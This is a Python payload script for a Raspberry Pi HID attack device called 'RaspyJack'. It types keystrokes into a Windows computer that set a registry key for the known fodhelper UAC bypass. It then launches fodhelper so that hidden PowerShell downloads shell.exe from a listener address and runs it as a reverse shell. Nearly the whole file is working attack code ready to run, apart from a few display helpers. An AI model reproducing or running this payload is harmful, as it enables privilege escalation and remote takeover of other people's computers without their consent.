#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: UAC Bypass (Fodhelper)**
==============================================================
A HID attack that attempts a UAC bypass on Windows using the `fodhelper.exe`
method. This technique works by hijacking a registry key that `fodhelper.exe`
(a trusted binary) reads when it starts.

This payload adds the registry key to execute a reverse shell when
fodhelper is launched.

**NOTE:** This is a well-known technique and may be detected by AV/EDR.
It also requires a listener to be running.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100"
LISTENER_PORT = "4444"

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "UAC Bypass"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # The command to be executed by the hijacked registry key
    revshell_cmd = f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('http://{LISTENER_IP}/shell.exe', 'C:\\Windows\\Temp\\s.exe'); C:\\Windows\\Temp\\s.exe"
    
    # Command to add the registry key
    reg_cmd = f"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \\"{revshell_cmd}\\" /f"

    script = f"""
GUI r
delay(500)
type("cmd")
delay(200)
press("ENTER")
delay(750)
type("{reg_cmd}")
delay(200)
press("ENTER")
delay(500)
type("fodhelper.exe")
delay(200)
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
